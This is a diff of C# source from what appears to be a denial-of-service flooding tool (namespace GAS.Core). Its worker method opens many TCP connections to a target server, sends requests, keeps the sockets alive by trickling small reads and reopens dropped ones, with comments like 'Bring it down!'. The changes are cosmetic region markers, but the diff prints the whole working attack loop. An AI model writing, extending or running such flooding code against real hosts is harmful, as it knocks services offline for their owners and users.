@@ -105,22 +105,29 @@ namespace GAS.Core
         private void bw_DoWork(object indexinthreads)
         {
 
+            #region Wait 4 full init
             while (!init) Thread.Sleep(100);
             int MY_INDEX_FOR_WORK = (int) indexinthreads;
+            #endregion
+            #region Attack
             try
             {
+                #region Prepare
                 int bsize = 16,mincl = 16384; // set minimal content-length to 16KB
                 byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(DefaultAgent),rbuf = new byte[bsize];
                 States[MY_INDEX_FOR_WORK] = ReqState.Ready;
                 var stop = DateTime.Now;
                 string redirect = "";
+                #endregion
                 while (IsFlooding)
                 {
+
                     stop = DateTime.Now.AddMilliseconds(Timeout);
                     States[MY_INDEX_FOR_WORK] = ReqState.Connecting; // SET STATE TO CONNECTING //
                     // forget about slow! .. we have enough saveguards in place!
                     while (IsDelayed && (DateTime.Now < stop))
                     {
+                        #region Connect
                         var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                         socket.ReceiveBufferSize = bsize;
                         try
@@ -131,32 +138,44 @@ namespace GAS.Core
                             socket.Send(sbuf);
                         }
                         catch { }
+                        #endregion
+                        #region We connected! Bring it down!
                         if (socket.Connected)
                         {
                             bool keeps = !_resp;
+                            #region Response analysis is enabled
                             if (_resp)
                             {
+                                #region Process redirects
                                 do
                                 { // some damn fail checks (and resolving dynamic redirects -.-)
+                                    #region On redirect
                                     if (redirect != "")
                                     {
+                                        #region Socket is dead -> let recreate it
                                         if (!socket.Connected)
                                         {
                                             socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                                             socket.ReceiveBufferSize = bsize;
                                             socket.Connect(((_ip == "") ? _dns : _ip), _port);
                                         }
+                                        #endregion
                                         sbuf = System.Text.Encoding.ASCII.GetBytes(DefaultAgent);
                                         socket.Send(sbuf);
                                         redirect = "";
                                     }
+                                    #endregion
                                     keeps = false;
+                                    #region Headers
                                     try
                                     {
+                                        #region Download headers
                                         string header = "";
                                         while (!header.Contains(Environment.NewLine + Environment.NewLine) && (socket.Receive(rbuf) >= bsize))
                                             header += System.Text.Encoding.ASCII.GetString(rbuf);
                                         string[] sp = header.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries),tsp;
+                                        #endregion
+                                        #region Process headers
                                         for (int i = (sp.Length - 1); i >= 0; i--)
                                         {
                                             tsp = sp[i].Split(':');
@@ -181,37 +200,50 @@ namespace GAS.Core
                                                 i = -1;
                                             }
                                         }
+                                        #endregion
                                     }
                                     catch { }
-                                } while ((redirect != "") && (DateTime.Now < stop));
+                                    #endregion
+                                }
+                                while ((redirect != "") && (DateTime.Now < stop));
+                                #endregion
                                 if (!keeps)
                                     Failed++;
                             }
+#endregion
+                            #region Do not wait for response
                             if (keeps)
                             {
                                 socket.Blocking = true; // we rely on this in the dl-loop!
                                 _lSockets[MY_INDEX_FOR_WORK].Insert(0, socket);
                                 Requested++;
                             }
+                            #endregion
                         }
+#endregion
+                        #region Some checks
                         if (_lSockets[MY_INDEX_FOR_WORK].Count >= _nSockets) IsDelayed = false;
                         else if (Delay > 0) System.Threading.Thread.Sleep(Delay);
+                        #endregion
                     }
                     States[MY_INDEX_FOR_WORK] = ReqState.Downloading;
+                    #region keep the sockets alive
                     for (int i = (_lSockets[MY_INDEX_FOR_WORK].Count - 1); i >= 0; i--)
-                    { // keep the sockets alive
+                    { 
                         try
                         {
                             // here's the downfall: if the server at one point decides to just discard the socket 
                             // and not close / reset the connection we are stuck with a half-closed connection
                             // testing for it doesn't work, because the server than resets the connection in order
                             // to respond to the new request ... so we have to rely on the connection timeout!
+                            #region Connect and remove dead
                             if (!_lSockets[MY_INDEX_FOR_WORK][i].Connected || (_lSockets[MY_INDEX_FOR_WORK][i].Receive(rbuf) < bsize))
                             {
                                 _lSockets[MY_INDEX_FOR_WORK].RemoveAt(i);
                                 Failed++;
                                 Requested--; // the "requested" number in the stats shows the actual open sockets
                             }
+                            #endregion
                             else Downloaded++;
                         }
                         catch
@@ -221,12 +253,17 @@ namespace GAS.Core
                             Requested--;
                         }
                     }
+                            #endregion
+                    #region stats
                     States[MY_INDEX_FOR_WORK] = ReqState.Completed;
                     IsDelayed = (_lSockets[MY_INDEX_FOR_WORK].Count < _nSockets);
                     if (!IsDelayed) System.Threading.Thread.Sleep(Timeout);
+                    #endregion
                 }
             }
             catch { States[MY_INDEX_FOR_WORK] = ReqState.Failed; }
+            #endregion
+            #region Cleanup
             finally
             {
                 IsFlooding = false;// not so sure about the graceful shutdown ... but why not?
@@ -237,6 +274,7 @@ namespace GAS.Core
                 States[MY_INDEX_FOR_WORK] = ReqState.Ready;
                 IsDelayed = true;
             }
+            #endregion
         }
     }
 }
